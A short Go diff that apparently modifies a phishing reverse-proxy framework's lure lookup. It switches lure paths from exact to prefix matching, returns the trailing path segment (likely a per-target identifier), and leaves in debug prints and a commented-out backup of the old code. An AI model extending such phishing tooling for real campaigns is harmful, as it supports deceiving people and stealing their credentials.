@@ -532,7 +532,7 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site string, path string) (*Lure, error, string) {
 	log.Warning("GetLureByPath: %s %s", site, path)
 
 	url_lure, _ := url.Parse(path)
@@ -554,13 +554,26 @@ func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 
 	for _, l := range c.lures {
 		if l.Phishlet == site {
-			if l.Path == path {
-				return l, nil
+			if strings.HasPrefix(path, l.Path) {
+				_, lastPart := filepath.Split(path)
+				fmt.Println("Is Same:", path == l.Path)
+				fmt.Println("Last Value:", lastPart)
+				return l, nil, lastPart
 			}
 		}
 	}
 
-	return nil, fmt.Errorf("lure for path '%s' not found", path)
+	//BACKUP
+	//for _, l := range c.lures {
+	//	if l.Phishlet == site {
+	//		if l.Path == path {
+	//
+	//			return l, nil
+	//		}
+	//	}
+	//}
+
+	return nil, fmt.Errorf("lure for path '%s' not found", path), ""
 }
 
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
